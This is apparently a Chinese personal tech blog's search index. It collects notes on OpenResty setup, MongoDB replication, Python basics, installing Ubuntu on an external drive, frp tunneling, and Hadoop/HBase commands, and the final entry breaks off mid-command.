<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[OpenResty从入门到实战笔记]]></title>
    <url>%2FOpenResty%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[安装官方教程 ubuntu 实践：1234567891011121314# import our GPG key:wget -qO - https://openresty.org/package/pubkey.gpg | sudo apt-key add -# for installing the add-apt-repository command# (you can remove this package and its dependencies later):sudo apt-get -y install software-properties-common# add the our official APT repository:sudo add-apt-repository -y &quot;deb http://openresty.org/package/ubuntu $(lsb_release -sc) main&quot;# to update the APT index:sudo apt-get updatesudo apt-get install openresty 官网直通车中文官网主页 OpenResty 官方 Yum 资源库提供下面的 RPM 包 NginxLuaModule 源码分析－某不知名大佬有道云笔记 开始第一个实例123resty -e &apos;print(&quot;hello, world&quot;)&apos; hello, world 准备目录布局123456先实践一个简单的mkdir ~/workcd ~/workmkdir logs/ conf/我们还为日志文件创建了 logs / 目录，为配置文件创建了 conf / 。 logs/error.log 1vim 造一个空文件 conf/nginx.conf 下面是不同的代码 123456789101112131415161718官方：worker_processes 1;error_log logs/error.log;events &#123; worker_connections 1024;&#125;http &#123; server &#123; listen 8080; location / &#123; default_type text/html; content_by_lua_block &#123; ngx.say(&quot;&lt;p&gt;hello, world&lt;/p&gt;&quot;) &#125; &#125; &#125;&#125; 12345678910111213141516极客时间：events &#123; worker_connections 1024;&#125;http &#123; server &#123; listen 8080; location / &#123; content_by_lua &apos; ngx.say(&quot;hello, world&quot;) &apos;; &#125; &#125;&#125; 12345678910111213141516极客时间：pid logs/nginx.pid;events &#123; worker_connections 1024;&#125;http &#123; server &#123; listen 8080; location / &#123; content_by_lua_file lua/hello.lua; &#125; &#125; &#125;&#125; 启动 Nignx 服务器/usr/local/openresty (this is the default) 确定路径正确 环境变量设置：12PATH=/usr/local/openresty/nginx/sbin:$PATHexport PATH 启动：12345nginx -p `pwd`/ -c conf/nginx.confcurl http://localhost:8080/ &lt;p&gt;hello, world&lt;/p&gt; ### 结构介绍1234567891011121314151617/usr/local/openresty/lualib$ lsdrwxr-xr-x 5 root root 4096 6月 17 22:04 ./drwxr-xr-x 10 root root 4096 6月 17 22:04 ../-rw-r--r-- 1 root root 39464 5月 17 07:33 cjson.so-rw-r--r-- 1 root root 5848 5月 17 07:33 librestysignal.sodrwxr-xr-x 3 root root 4096 6月 17 22:04 ngx/drwxr-xr-x 2 root root 4096 6月 17 22:04 redis/drwxr-xr-x 8 root root 4096 6月 17 22:04 resty/-rw-r--r-- 1 root root 1374 5月 17 07:33 tablepool.luangx: 存放的是 lua-resty-core 这个官方项目中的 Lua 代码，里面都是基于 FFI 重新实现的 OpenResty APIresty: 存放的则是各种 lua-resty-* 项目包含的 Lua 代码PS: 早期的 OpenResty 同时带有 Lua 和 LuaJIT，你可以通过编译选项，来决定使用 Lua 还是 LuaJIT。不过到了现在，Lua 逐渐被淘汰，就只支持更高性能的 LuaJIT 了。 OpenResty 项目概览OpenResty 包含了 68 个公开的项目 NGINX C 模块OpenResty 中一共包含了 20 多个 C 模块，我们在本节最开始使用的 openresty -V 中，也可以看到这些 C 模块： –add-module=后面跟着的，就是 OpenResty 的 C 模块。其中，最核心的就是 lua-nginx-module 和 stream-lua-nginx-module，前者用来处理七层流量，后者用来处理四层流量。 这些 C 模块中，有些是需要特别注意的，虽然默认编译进入了 OpenResty，但并不推荐使用。 lua 是未来，其他项目大多处于疏于维护状态。 lua-resty- 周边库OpenResty 官方仓库中包含 18 个 lua-resty-* 库，涵盖 Redis、MySQL、memcached、websocket、dns、流量控制、字符串处理、进程内缓存等常用库。 了官方自带的之外，还有更多的第三方库。 自己维护的 LuaJIT 分支 LuaJIT 分支 OpenResty 除了维护自己的 OpenSSL patch 外，还维护了自己的 LuaJIT 分支。 相对于 Lua，LuaJIT 增加了不少独有的函数，这些函数非常重要 测试框架 Perl 语言来开发的 test-nginx:OpenResty 官方的所有 C 模块和 lua-resty 库的测试案例，都是由 test-nginx 驱动的。 可以模拟慢速的网络的 mockeagain :让程序每次只读写一个字节。 调试工具链动态追踪技术漫谈 使用 systemtap 最大的优势，便是实现活体分析，同时对目标程序完全无侵入。 openresty-systemtap-toolkit stapxx 打包相关openresty-packaging home-brew 工程化工具Perl 开发的 OpenResty 和 NGINX 的工具集 openresty-devel-utils lj-releng 是一个简单有效的 LuaJIT 代码检测工具，类似 luacheck，可以找出全局变量等潜在的问题。 reindex 从名字来看是重建索引的意思，它其实是格式化 test-nginx 测试案例的工具，可以重新排列测试案例的编号，以及去除多余的空白符。reindex 可以说是 OpenResty 开发者每天都会用到的工具之一。 opsboy 也是一个深藏不露的项目，主要用于自动化部署。OpenResty 每次发布版本前，都会在 AWS EC2 集群上做完整的回归测试，详细的文档你可以参考官方文档，而这个回归测试正是由 opsboy 来部署和驱动的。opsboy 是一个用 Perl 实现的 DSL（领域特定语言）。 OpenResty 中用到的 NGINX 知识NGINX 配置NGINX 通过配置文件来控制自身行为，它的配置可以看作是一个简单的 DSL。NGINX 在进程启动的时候读取配置，并加载到内存中。如果修改了配置文件，需要你重启或者重载 NGINX，再次读取后才能生效。 NGINX 支持的功能，OpenResty 并不一定支持，需要看 OpenResty 的版本号。 MASTER-WORKER 模式 执行阶段执行阶段也是 NGINX 重要的特性，与 OpenResty 的具体实现密切相关。NGINX 有 11 个执行阶段． 二进制热升级热升级通过向旧的 Master 进程发送 USR2 和 WINCH 信号量来完成。对于这两步，前者的作用，是启动新的 Master 进程；后者的作用，是逐步关闭 Worker 进程。 执行完这两步后，新的 Master 和新的 Worker 就已经启动了。不过此时，旧的 Master 并没有退出。不退出的原因也很简单，如果你需要回退，依旧可以给旧的 Master 发送 HUP 信号量。当然，如果你已经确定不需要回退，就可以给旧 Master 发送 KILL 信号量来退出。 NGINX 官方文档官方文档 OpenResty 的作者 NGINX 教程 管理第三方包工具OPMOpenResty 自带的包管理器1234opm search ‘包名’返回：GitHub ID / repo name OPM 官网 LUAROCKSLuaRocks 官网1luarocks search &quot;包名&quot; 我们可以到 LuaRocks 的网站上，去查看这个包的详细信息，这里面包含了作者、License、GitHub 地址、下载次数、功能简介、历史版本、依赖等。和 OPM 不同的是，LuaRocks 并没有直接使用 GitHub 的用户信息，而是需要开发者单独在 LuaRocks 上进行注册。 开源的 API 网关项目 KongKong 项目地址 AWESOME-RESTYOPM 和 LuaRocks 都不支持私有包。 AWESOME-RESTY 项目地址 库 以及一些 项目 lua-resty-requests 它是人类更友好的 HTTP 访问库，接口风格与 Python 中大名鼎鼎的 Requests 一致。 python-requests OpenResty 的官方网站项目: openresty.org 基于 systemtap 的扩展 GDB 的工具集 简单的 API - ngx.base64_decodelua-resty-core 在 Lua 中，你可以用 Lua C API 来调用 C 函数，而在 LuaJIT 中还可以使用 FFI。对 OpenResty 而言： 在核心的 lua-nginx-module 中，调用 C 函数的 API，都是使用 Lua C API 来完成的；而在 lua-resty-core 中，则是把 lua-nginx-module 已有的部分 API，使用 FFI 的模式重新实现了一遍。 Lua CFunction能够被 Lua 调用的 C 函数来说，它的接口必须遵循 Lua 要求的形式，也就是 typedef int (lua_CFunction)(lua_State L)。 它包含的参数是 lua_State 类型的指针 L ；它的返回值类型是一个整型，表示返回值的数量，而非返回值自身。 for example:1234567891011121314151617181920static int ngx_http_lua_ngx_decode_base64(lua_State *L) &#123; ngx_str_t p, src; src.data = (u_char *) luaL_checklstring(L, 1, &amp;src.len); p.len = ngx_base64_decoded_length(src.len); p.data = lua_newuserdata(L, p.len); if (ngx_decode_base64(&amp;p, &amp;src) == NGX_OK) &#123; lua_pushlstring(L, (char *) p.data, p.len); &#125; else &#123; lua_pushnil(L); &#125; return 1; &#125; LuaJIT FFIFFI 的交互部分是用 Lua 实现的，这部分代码可以被 JIT 跟踪到，并进行优化;1234567891011121314151617ngx.decode_base64 = function (s) local slen = #s local dlen = base64_decoded_length(slen) local dst = get_string_buf(dlen) local pdlen = get_size_ptr() local ok = C.ngx_http_lua_ffi_decode_base64(s, slen, dst, pdlen) if ok == 0 then return nil end return ffi_string(dst, pdlen[0]) endngx_http_lua_ffi_ ，是用 FFI 来处理 NGINX http 请求的 Lua 函数；ngx_http_lua_ngx_ ，是用 Cfunction 来处理 NGINX http 请求的 Lua 函数；其他 ngx_ 和 lua_ 开头的函数，则分别属于 NGINX 和 Lua 的内置函数。 OpenResty® C 代码风格指南:对于有意学习 OpenResty 的 C 代码并提交 PR 的开发者来说，这是必备的一篇文档。 LuaJIT 官方的教程 LuaJIT 文档 LuaJIT FFI GCLuaJIT 只负责由自己分配的资源；而 ffi.C 是 C 库的命名空间，所以，使用 ffi.C 分配的空间不由 LuaJIT 负责，需要你自己手动释放。 如果要在 OpenResty 中申请大块的内存，我更推荐你用 ffi.C.malloc 而不是 ffi.new。原因也很明显： ffi.new 返回的是一个 cdata，这部分内存由 LuaJIT 管理； LuaJIT GC 的管理内存是有上限的，OpenResty 中的 LuaJIT 并未开启 GC64 选项，所以单个 worker 内存的上限只有 2G。一旦超过 LuaJIT 的内存管理上限，就会导致报错。 在使用 FFI 的时候，我们还需要特别注意内存泄漏的问题。周边测试和调试工具. lua-resty-core现在新的 API，都通过 FFI 的方式，在 lua-resty-core 仓库中实现。 LuaJIT分支和标准Lua LuaJIT 在 OpenResty 整体架构中的位置： 标准 Lua 和 LuaJIT 的关系标准 Lua 和 LuaJIT 是两回事儿，LuaJIT 只是兼容了 Lua 5.1 的语法。 LuaJIT 的性能优势标准 Lua 出于性能考虑，也内置了虚拟机，所以 Lua 代码并不是直接被解释执行的，而是先由 Lua 编译器编译为字节码（Byte Code），然后再由 Lua 虚拟机执行。 LuaJIT 的运行时环境，除了一个汇编实现的 Lua 解释器外，还有一个可以直接生成机器代码的 JIT 编译器。开始的时候，LuaJIT 和标准 Lua 一样，Lua 代码被编译为字节码，字节码被 LuaJIT 的解释器解释执行。 所谓 LuaJIT 的性能优化，本质上就是让尽可能多的 Lua 代码可以被 JIT 编译器生成机器码，而不是回退到 Lua 解释器的解释执行模式。]]></content>
      <categories>
        <category>OpenResty</category>
      </categories>
      <tags>
        <tag>Lua</tag>
        <tag>OpenResty</tag>
        <tag>Nignx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019年中总结]]></title>
    <url>%2F2019%E5%B9%B4%E4%B8%AD%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[请输入访问密匙 Decrypt ]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB实战经验]]></title>
    <url>%2FMongoDB%E5%AE%9E%E6%88%98%E7%BB%8F%E9%AA%8C%2F</url>
    <content type="text"><![CDATA[安装树莓派上的安装仅仅适用于Raspbian这种debian系，CentOS等其他树莓派系统无法启用，网上有很多尝试，都很复杂，徒劳。 Raspbian如果使用的是raspbian，源里面有这个软件的： 1sudo apt install mongodb CentOS等这里说一下Centos版本的Pi的安装： 结果就是：无法成功！ windows上的安装仅列出关键步骤 1、在mongodb目录下建立data文件夹，然后在data文件夹建立db文件夹，然后在控制台中使用上面的指令启动mongodb：123mongod --dbpath D:\NoSQL\mongodb-win32-x86_64-2.4.3\data\db注意：控制台输出有错误&quot;ERROR: dbpath (\data\db\) does not exist.&quot; \data\db\文件路径不存在。用这条代码运行。 2、在mongodb目录下建立data文件夹，然后在data文件夹建立log文件夹1mongod --dbpath &quot;D:\MongoDB\data\db&quot; --logpath &quot;D:\MongoDB\data\log\MongoDB.log&quot; --install --serviceName &quot;MongoDB&quot; 3、作为服务进行安装 MongoDB在Windows中还可以作为服务进行安装。这样可以通过控制面板-管理工具-服务来启动和关闭mongo了。 使用完整的路径来运行，忽略所有空格并使用–install选项，就可以安装了（–logpath必须设置 ）。1mongod -dbpath &quot;D:\NoSQL\mongodb-win32-x86_64-2.4.3\data\db&quot; --logpath &quot;D:\NoSQL\mongodb-win32-x86_64-2.4.3\data\log\mongodb.log&quot; --install --serviceName &quot;MongoDB&quot; 4、运行/停止12net start MongoDBnet stop MongoDB MongoDB在linux上的运行123456789101. 启动MongoDBsudo service mongod start2. 验证MongoDB是否启动成功（在/var/log/mongodb/mongod.log文件中看到下面这一行就表示启动成功）[initandlisten] waiting for connections on port 270173. 停止MongoDB进程sudo service mongod stop4. 重启MongoDBsudo service mongod restart5. 查看MongoDB运行状态sudo service mongod status mongodb远程连接配置修改配置文件mongodb.conf 命令：vim /etc/mongodb.conf 把 bind_ip=127.0.0.1 这一行注释掉或者是修改成 bind_ip=0.0.0.0 连接到自定义的用户1.增加123&gt; use adminswitched to db admin&gt; db.addUser(&apos;username&apos;,&apos;password&apos;) 2.远程连接 命令： mongo 134.567.345.23:27017/admin -uusername -p 输入password即可 MongoDB 的主从复制与双主复制主从双主MM和MS方式操作基本相同，只是两端都是MASTER。还是借用上一篇文章的我文件目录。 启动MASTER11/usr/local/bin/mongod --master --slave -dbpath=/data/db/master -port=11536 --source 127.0.0.1:11537 启动MASTER21/usr/local/bin/mongod --master --slave -dbpath=/data/db/master -port=11537 --source 127.0.0.1:11536 这里比较有意思，启动参数里把–master 和 –slave 指定，就可以存在双层身份了。 查看MASTER2打印出来的信息，如下：1234Mon Jul 25 22:28:26 [conn1] getmore local.oplog.$main cid:7469048783387752013 getMore: &#123; ts: &#123; $gte: new Date(5633526834852265985) &#125; &#125; bytes:20 nreturned:0 3919msMon Jul 25 22:28:27 [replslave] repl: applied 1 operationsMon Jul 25 22:28:27 [replslave] repl: end sync_pullOpLog syncedTo: Jul 25 22:28:20 4e2e5074:1Mon Jul 25 22:28:27 [replslave] repl: from host:127.0.0.1:11537 这里可以看到from host:127.0.0.1:11537在MASTER1上可以看到类似的信息，端口为11536 在M1上创建库，表，M2上可以查到。M2上删除记录，M1上可以看到。双向同步成功。1Mon Jul 25 22:28:26 [conn1] getmore local.oplog.$main cid:7469048783387752013 getMore: &#123; ts: &#123; $gte: new Date(5633526834852265985) &#125; &#125; bytes:20 nreturned:0 3919ms 这样的信息是正常的，不影响复制。]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python查缺补漏]]></title>
    <url>%2Fpython%E6%9F%A5%E7%BC%BA%E8%A1%A5%E6%BC%8F%2F</url>
    <content type="text"><![CDATA[2019.4.12new、init在 Python 3 的类中，new 负责对象的创建，而 init 负责对象的初始化；new 是一个类方法，而 init 是一个对象方法。 new 是我们通过类名进行实例化对象时自动调用的，init 是在每一次实例化对象之后调用的，new 方法创建一个实例之后返回这个实例对象，并将其传递给 init 方法的 self 参数。 深入理解Python中的 _ new _ 和 _ init _ ##3 metaclass() 内置函数 type() 和 isinstance() type() （1）查看一个变量（对象）的类型；（2）创建一个类（class） 2019.6.4jqueryjQuery 是一个 JavaScript 库。 jQuery 极大地简化了 JavaScript 编程。 要爬取静态网页的html代码，可以使用 jquery去模仿写html。 AjaxAJAX = Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）。 AJAX 不是新的编程语言，而是一种使用现有标准的新方法。 AJAX 最大的优点是在不重新加载整个页面的情况下，可以与服务器交换数据并更新部分网页内容。 AJAX 不需要任何浏览器插件，但需要用户允许JavaScript在浏览器上执行。 菜鸟教程 Python enumerate() 函数enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。 语法以下是 enumerate() 方法的语法: enumerate(sequence, [start=0]) 参数12sequence -- 一个序列、迭代器或其他支持迭代对象。start -- 下标起始位置。 返回值 返回 enumerate(枚举) 对象。 Headless无头浏览器无头浏览器即headless browser，是一种没有界面的浏览器。既然是浏览器那么浏览器该有的东西它都应该有，只是看不到界面而已。 Headless Chrome截止目前最新的Chrome版本在Mac\Linux\Windows上都可以使用headless模式 调用方式：1234567a、使用命令行进行调用首先需要把chrome的安装路径添加到系统路径下面，调用方式如下chrome --headless http://www.baidu.comb、通过selenuim进行调用（目前java\python等主流语言都支持selenuim） Headless Firefox截止目前最新的Chrome版本在Mac\Linux\Windows上都可以使用headless模式 调用方式：123a、使用命令行进行调用 firefox -headless http://www.baidu.comb、通过selenuim进行调用 PhantomJS调用方式： 123456a、使用命令行进行调用首先在官方网站下载最新的phantomJS版本，并把安装目录的路径添加到系统路径下，然后在命令行打开，使用命令 phantomJS xx.js url 运行JS脚本。PhantomJS脚本参考：b、在nodejs中使用phantomjs，需要用到phantomjs中的一个Child Process模块，介绍在这里http://phantomjs.org/api/child_process/。github已经有对phantomjs的node支持库，项目地址在这里https://github.com/amir20/phantomjs-nodec、通过selenuim进行调用(目前已经不支持了) 什么是主从同步HDFS HBase Xpath 与正则管道应用实例： twisted 框架 与python 框架爬虫框架有哪些python中的多进程与多线程selenium + phantomjspython分批读取数据新式类、经典类区别设计模式单例模式python 中的可变类型与不可变类型类方法、类实例方法、静态方法python 的内存管理、内存调优手段、内存泄漏处理装饰器与重载生成器与迭代器值传递、引用传递缺省参数回调参数hasattr() gatattr() setattr()闭包yield、generator、iterator]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[将Ubuntu系统安装到移动硬盘]]></title>
    <url>%2F%E5%B0%86Ubuntu%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E5%88%B0%E7%A7%BB%E5%8A%A8%E7%A1%AC%E7%9B%98%2F</url>
    <content type="text"><![CDATA[前言最近开了Hadoop课程，学校电脑win7再开个虚拟机，这样的话就很卡，又有还原卡，自带电脑的话感觉累，第难熬太重了，麻烦，所以为了方便性，就是想着将Ubuntu系统安装到移动硬盘。 步骤这个和电脑安装双系统是一样的，但是有些许不同，走了许多弯路。 我这次用的是SSD，想着一半存文件，一般安装ubuntu，但是太坑，Ubuntu强制 4K 对齐，不然不让你下一步，唯一的以这种方法就是用一个PE，进入PE后手动对硬盘分区。 ubuntu 安装系统的时候，特别是双系统的时候，网上许多教程都是要求分区，这并不一定完全必要，因为Ubuntu的安装方式中有一个自动分区的默认安装方式，但是该方式会格式化整个盘，并不是从硬盘中分割一块空间进行安装。 所以这里建议，如果是HHD，分割100G做双系统，手动分区。如果是SSD，双系统之前做好文件备份工作防止手误，手动分区4K对齐我值成功一次，但是安装的时候问题很大，也是放弃了这种方式，这里建议搞一块移动硬盘来操作。 安装移动硬盘中有一个问题很严重，就是引导问题，ubuntu会自动是别是不是双系统，然后把ubuntu的引导安装到win的引导中，然后导致硬盘换个电脑之后就启动不了，应为硬盘里没有引导。应该有方法可以把引导转移到移动硬盘中，但是应该很麻烦，所以有个很简单的方法，找台电脑，把其他盘拆了，安装镜像的时候只接移动硬盘，简单粗暴。 对于这种方式的安装、有一种坑就是有些主板会默认把引导安装到主板上。。。。。一般是老电脑，安装时候看下分区提醒，正常会分一个引导分区，老电脑就不会分引导分区，然后换电脑之后修复也修复不了。。。。。这种电脑似乎也识别不了硬盘中的分区。。。 内网穿透相关安装frp 安装地址：https://github.com/fatedier/frp/releases 参考教程 1、进入解压目录cd frp_0.13.0_linux_amd64，这里主要关注4个文件，分别是frpc、frpc.ini和frps、frps.ini，前者两个文件是客户端所关注文件，后者两个文件是服务端所关注两个文件。 2、配置服务端（公网服务器），首先删掉frpc、frpc.ini两个文件，然后再进行配置，vi ./frps.ini，1234[common]bind_port = 7000 #与客户端绑定的进行通信的端口vhost_http_port = 6081 #访问客户端web服务自定义的端口号保存然后启动服务./frps -c ./frps.ini，这是前台启动，后台启动命令为nohup ./frps -c ./frps.ini &amp; 3、配置客户端（内网服务器），首先删掉frps、frps.ini两个文件,然后再进行配置，vi ./frpc.ini12345678910111213141516[common]server_addr = 120.56.37.48 #公网服务器ipserver_port = 7000 #与服务端bind_port一致 #公网通过ssh访问内部服务器[ssh]type = tcp #连接协议local_ip = 192.168.3.48 #内网服务器iplocal_port = 22 #ssh默认端口号remote_port = 6000 #自定义的访问内部ssh端口号 #公网访问内部web服务器以http方式[web]type = http #访问协议local_port = 8081 #内网web服务的端口号custom_domains = repo.iwi.com #所绑定的公网服务器域名，一级、二级域名都可以 保存然后执行./frpc -c ./frpc.ini启动，这是前台启动，后台启动命令为nohup ./frpc -c ./frpc.ini &amp; 4、访问方式 （1）外网ssh访问内网服务器（直接使用配置里面数据演示）1ip：repo.iwi.com port:6000 用户名：linux服务器的用户 密码：linux服务器的密码 （2）自定义绑定域名访问内网web服务（直接使用配置里面数据演示） repo.iwi.com:6081 FRP 设置开机自启动参考：https://blog.csdn.net/x7418520/article/details/81077652 ubuntu FRP 设置开机自启动网上有4种方法，这种比较靠谱： 我们使用 ubuntu Linux下常用的进程管理器supervisor来管理FRP服务。 1、首先需要安装supervisor。 sudo apt install supervisor 2、然后在/etc/supervisor/conf.d下新建一个配置文件frp.conf，输入以下内容。command应该是你放置frp软件的位置。12345[program:frp]command = /root/frps -c /root/frps.iniautostart = true 3、然后启动supervisor，如果事先已经安装好了supervisor那么就重新启动。之后查看一下supervisor的运行状态，看看frp是否已在运行。1234567重启supervisorsudo systemctl restart supervisor查看supervisor运行状态sudo supervisorctl status centos FRP 设置开机自启动在CentOS系统下，主要有两种方法设置自己安装的程序开机启动。1、把启动程序的命令添加到/etc/rc.d/rc.local文件中。客户端自启动12345678!/bin/sh#This script will be executed *after* all the other init scripts.You can put your own initialization stuff in here if you don&apos;twant to do the full Sys V style init stuff. nohup /root/frpc -c /root/frpc.ini &gt;/root/frpc/log.txt 2&gt;&amp;1 &amp; 服务端自启动12345678!/bin/sh#This script will be executed *after* all the other init scripts.You can put your own initialization stuff in here if you don&apos;twant to do the full Sys V style init stuff.nohup /root/frps -c /root/frps.ini &gt;/root/frpc/log.txt 2&gt;&amp;1 &amp; 备注：请将 路径地址换成您电脑系统的真是路径]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2019年4、5月总结]]></title>
    <url>%2F2019%E5%B9%B44%E3%80%815%E6%9C%88%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[请输入访问密匙 Decrypt ]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Hadoop</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[链接整理]]></title>
    <url>%2F%E9%93%BE%E6%8E%A5%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[请输入访问密匙 Decrypt ]]></content>
      <categories>
        <category>链接收集</category>
      </categories>
      <tags>
        <tag>链接</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hadoop入门笔记]]></title>
    <url>%2FHadoop%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Hadoop 安装以及（伪）分布式集群经典教程：Hadoop安装在阿里云中搭建大数据实验环境 —-仅有点儿参考价值 注解：12345678910111213/etc/profile:此文件为系统的每个用户设置环境信息,当用户第一次登录时,该文件被执行，并从/etc/profile.d目录的配置文件中搜集shell的设置，/etc/bashrc:为每一个运行bash shell的用户执行此文件，当bash shell被打开时,该文件被读取。~/.bash_profile:每个用户都可使用该文件输入专用于自己使用的shell信息,当用户登录时,该文件仅仅执行一次!默认情况下,他设置一些环境变量,执行用户的.bashrc文件。~/.bashrc:该文件包含专用于你的bash shell的bash信息,当登录时以及每次打开新的shell时,该文件被读取。***hadoop 的 JAVA 变量必须在 ~/.bashrc，尽量使用 1.8 版本，后面的 sbt 版本要求是 1.8*** 123456789Hadoop 附带了丰富的例子（运行 ./bin/hadoop jar ./share/hadoop/mapreduce/hadoop-mapreduce-examples-2.6.0.jar 可以看到所有例子），包括 wordcount、terasort、join、grep 等。在此我们选择运行 grep 例子，我们将 input 文件夹中的所有文件作为输入，筛选当中符合正则表达式 dfs[a-z.]+ 的单词并统计出现的次数，最后输出结果到 output 文件夹中。注意，Hadoop 默认不会覆盖结果文件，因此再次运行上面实例会提示出错，需要先将 ./output 删除。rm -r ./output hadoop 命令12345678910111213141516启动/关闭：start-all.sh //这个 hadoop 启动命令会和 spark 命令重复，所以会提示缺少一个spark的jar包，不影响hadoop的启动。要再执行下 jobhistory 脚本start-dfs.shstart-yarn.shmr-jobhistory-daemon.sh start historyserver //支持查看作业历史运行信息如何通过Web查看job的运行情况: https://www.linuxidc.com/Linux/2015-05/117501.htmhttp://master:50070/http://master:8088/clusterHDFS操作常用Shell命令：http://dblab.xmu.edu.cn/blog/1625-2/HDFS Shell命令官方文档：http://hadoop.apache.org/docs/r2.5.2/hadoop-project-dist/hadoop-common/FileSystemShell.html 利用Java API与HDFS进行交互经典教程：大数据技术原理与应用 第三章 分布式文件系统HDFS 学习指南 HAdoop API 爬坑注： 有可能会报错，原因需要代码中添加用户名、密码。 hbaseHBase是一个分布式的、面向列的开源数据库,一个结构化数据的分布式存储系统”。就像Bigtable利用了Google文件系统（File System）所提供的分布式数据存储一样，HBase在Hadoop之上提供了类似于Bigtable的能力。HBase是Apache的Hadoop项目的子项目。HBase不同于一般的关系数据库，它是一个适合于非结构化数据存储的数据库。另一个不同的是HBase基于列的而不是基于行的模式。 经典教程：大数据原理与应用 第四章 分布式数据库HBase 学习指南 笔记123456789101112131415161718192021222324252627运行HBase:第一步：首先启动Hadoop，如果已经启动hadoop请跳过此步骤。命令如下：start-all.sh第二步：切换目录至/usr/local/hbase;再启动HBase.命令如下：cd /usr/local/hbase./bin/start-hbase.sh进入HBase Shell交互式执行环境：cd /usr/local/hbase./bin/hbase shellHadoop的HDFS中查看变化：linziyu@iZbp11gznj7n38xkztu64dZ:/usr/local/hadoop$ ./bin/hdfs dfs -ls /Found 2 itemsdrwxr-xr-x - linziyu supergroup 0 2018-04-11 17:35 /hbasedrwxr-xr-x - linziyu supergroup 0 2018-04-06 22:40 /user可以看到，在HDFS中，自动生成了一个“/hbase”目录，用来保存HBase的数据。注意：如果在操作HBase的过程中发生错误，可以通过&#123;HBASE_HOME&#125;目录（/usr/local/hbase）下的logs子目录中的日志文件查看错误原因。这里启动关闭Hadoop和HBase的顺序一定是：启动Hadoop—&gt;启动HBase—&gt;关闭HBase—&gt;关闭Hadoop 12345ERROR: Can&apos;t get master address from ZooKeeper; znode data == nullas:重启hbase（可能是zookeeper或hbase不稳定造成的 重启不一定起作用）or执行hdfs格式化命令：hadoop namenode -format (删除临时文件/格式化) HBase 常用Shell命令 hbase shell命令 描述 alter 修改列族（column family）模式 count 统计表中行的数量 create 创建表 describe 显示表相关的详细信息 delete 删除指定对象的值（可以为表，行，列对应的值，另外也可以指定时间戳的值） deleteall 删除指定行的所有元素值 disable 使表无效 drop 删除表 enable 使表有效 exists 测试表是否存在 exit 退出hbase shell get 获取行或单元（cell）的值 incr 增加指定表，行或列的值 list 列出hbase中存在的所有表 put 向指向的表单元添加值 tools 列出hbase所支持的工具 scan 通过对表的扫描来获取对用的值 status 返回hbase集群的状态信息 shutdown 关闭hbase集群（与exit不同） truncate 重新创建指定表 version 返回hbase版本信息 表的管理1）通过list可以列出所有已创建的表(除-ROOT表和.META表(被过滤掉了)) hbase(main)&gt; list 2）创建表，其中t1是表名，f1、f2是t1的列族。hbase中的表至少有一个列族.它们之中，列族直接影响hbase数据存储的物理特性。12345语法：create &lt;table&gt;, &#123;NAME =&gt; &lt;family&gt;, VERSIONS =&gt; &lt;VERSIONS&gt;&#125; 例如：创建表t1，有两个family name：f1，f2，且版本数均为2hbase(main)&gt; create &apos;t1&apos;,&#123;NAME =&gt; &apos;f1&apos;, VERSIONS =&gt; 2&#125;,&#123;NAME =&gt; &apos;f2&apos;, VERSIONS =&gt; 2&#125; 3）删除表12345分两步：首先disable，然后drop例如：删除表t1hbase(main)&gt; disable &apos;t1&apos;hbase(main)&gt; drop &apos;t1&apos; 4）查看表的结构1234语法：describe(desc) &lt;table&gt; （可以看到这个表的所有默认参数）例如：查看表t1的结构hbase(main)&gt; describe &apos;t1&apos; / desc &apos;t1&apos; 5）修改表结构修改表结构必须先disable1234567语法：alter &apos;t1&apos;, &#123;NAME =&gt; &apos;f1&apos;&#125;, &#123;NAME =&gt; &apos;f2&apos;, METHOD =&gt; &apos;delete&apos;&#125;例如：修改表test1的cf的TTL为180天hbase(main)&gt; disable &apos;test1&apos;hbase(main)&gt; alter &apos;test1&apos;,&#123;NAME=&gt;&apos;body&apos;,TTL=&gt;&apos;15552000&apos;&#125;,&#123;NAME=&gt;&apos;meta&apos;, TTL=&gt;&apos;15552000&apos;&#125;hbase(main)&gt; enable &apos;test1&apos; 6)查看表中所有记录 scan123语法：scan &apos;tablename&apos;scan &apos;wc&apos; 7)alter123456语法：alter ‘tablename’,NAME=&gt;’familyname’,attribute=&gt;new_value 例子：给表添加列族 alter添加一个名字叫sid的列族VERSIONS值为5alter &apos;wc&apos;,NAME=&gt;&apos;sid&apos;,VERSION=&gt;5 8）删除列族，需首先将表disablealter ‘tablename’,’delete’=&gt;’column family’删除一个列族之后，这个列族的数据也会全部被删除。9)删除表范围运算符，需首先将表disablealter ‘tablename’,METHOD=&gt;’table_att_unset’,NAME=&gt;’MAX_FILESIZE’10)incr 计数器1234incr &apos;tablename&apos;,&apos;rowkey&apos;,&apos;column family:column&apos; step step是步长，可选，默认为1给‘id’这个行健增加&apos;column_famaly1:addr&apos;字段，并使用counter实现递增 12345678910111213141516171819hbase(main):002:0&gt; incr &apos;table&apos;,&apos;id&apos;,&apos;column_famaly1:addr&apos;COUNTER VALUE = 10 row(s) hbase(main):003:0&gt; incr 